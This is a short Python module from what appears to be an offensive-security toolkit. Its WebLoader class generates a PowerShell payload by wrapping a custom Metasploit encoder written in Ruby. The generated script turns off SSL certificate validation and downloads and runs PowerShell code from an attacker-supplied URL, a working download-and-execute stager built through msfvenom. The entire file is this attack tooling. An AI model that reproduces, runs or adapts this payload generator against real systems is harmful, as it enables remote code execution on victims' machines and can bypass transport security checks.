from lets.__module__ import Module, Mount, Container


class WebLoader(Module):
    """
    Generate a PowerShell script that executes further PowerShell code
    from a web resource.
    """
    images = [
        "local/metasploit:1.0.0",   # amd64 only!
        ]

    @classmethod
    def add_arguments(self, parser):
        parser.add_argument("url", type=str, help="url of web resource")

    def handle(self, input, url):

        import lets.generate.payload.msfvenom as msfvenom

        source = """
require 'rex/powershell'

class MetasploitModule < Msf::Encoder
    Rank = ManualRanking

    include Rex::Powershell::PshMethods

    def initialize
        super(
            'Arch'          => ARCH_ALL,
            'EncoderType'   => Msf::Encoder::Type::Unspecified)
    end

    def encode_block(state, block)
        ignore_cert = Rex::Powershell::PshMethods.ignore_ssl_certificate
        download = Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string('%s')
        return "#{ignore_cert}#{download}"
    end
end
""" % url

        yield msfvenom.run_custom_encoder(source)
